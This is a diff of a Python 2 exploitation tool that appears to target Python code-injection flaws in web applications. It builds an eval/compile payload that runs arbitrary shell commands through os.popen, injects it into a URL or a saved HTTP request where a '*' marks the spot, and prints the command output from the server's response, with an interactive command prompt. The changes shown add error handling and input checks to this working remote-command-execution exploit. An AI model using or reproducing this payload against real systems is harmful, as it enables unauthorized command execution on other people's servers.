@@ -32,7 +32,7 @@ def parse_url(command,user_url,user_param=None):
     insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
     #insert = '''eval(compile("""for x in range(1):\\n import subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
     encoded = urllib.quote(insert)
-    print user_param    
+    #print user_param    
     if user_param == None:
         # Look for the * and replace * with the payload
         split_user_url = user_url.split('*')
@@ -49,18 +49,22 @@ def parse_url(command,user_url,user_param=None):
     return url
 
 def parse_request(command,filename,user_param=None):
+    #print user_param
     with open(filename,'rb') as file:
         insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
         encoded = urllib.quote(insert)
         request1 = file.read()
         #req_obj = HTTPRequest(request1)      
-
-        #print request1
-        acceptline = re.search('Accept:.*',request1)
-        #print str(acceptline.group(0))
-        updated = re.sub("\*",encoded, request1)
-        updated2 = re.sub('Accept:.*',str(acceptline.group(0)), updated)        
-        req_obj = HTTPRequest(updated2)  
+        if user_param == None:
+            
+            acceptline = re.search('Accept:.*',request1)
+            #print str(acceptline.group(0))
+            updated = re.sub("\*",encoded, request1)
+            updated2 = re.sub('Accept:.*',str(acceptline.group(0)), updated)        
+            req_obj = HTTPRequest(updated2)
+        else:
+            print "Request file and specified parameter are not currently supported together. \nPlease place a * in the request file\n"
+            exit()
         #print updated2
         url = '%s%s' % (req_obj.headers['host'],req_obj.path)
         if req_obj.command == "GET":
@@ -94,10 +98,15 @@ def select_command(user_url,user_param=None):
     match = re.search('([---------------------------------------------------][\n])(.*)',response.content)
 
     #print match
-    command_output = str(match.group(0))
-    print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
-    print command_output.replace('\\n','\n')
-    # print command_output
+    try:
+        command_output = str(match.group(0))
+        print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
+        print command_output.replace('\\n','\n')
+        # print command_output
+    except:
+        print "No output found.  Debug info:"
+        print "-----------------------------"
+        print response
 
 def send_request(url,command,headers=None,data=None):
     #print headers
@@ -122,11 +131,22 @@ def send_request(url,command,headers=None,data=None):
         response = requests.get(url, headers=headers)
     #print response.headers
     #print response.content
-    match = re.search('([----------][\n])(.*)',response.content)
-    command_output = str(match.group(0))
-    print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
-    print command_output.replace('\\n','\n').replace('\\t','\t')
-    # print command_output
+    match = re.search('([---------------------------------------------------][\n])(.*)',response.content)
+    try:
+        command_output = str(match.group(0))
+        print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
+        print command_output.replace('\\n','\n')
+        # print command_output
+    except Exception as error:
+        print "\nCould not found command output.  Debug info:\n"
+        print "---------------Response Headers---------------"
+        print response.headers
+        print "---------------Response Content---------------"
+        print response.content
+        return error
+
+
+
 
 
 
@@ -213,6 +233,7 @@ if __name__ == '__main__':
                 new_cmd = raw_input("Command:")
                 parsed_url,headers,data = parse_request(new_cmd,options.request,options.parameter)
                 send_request(parsed_url,options.cmd,headers,data)
+
 
 
 
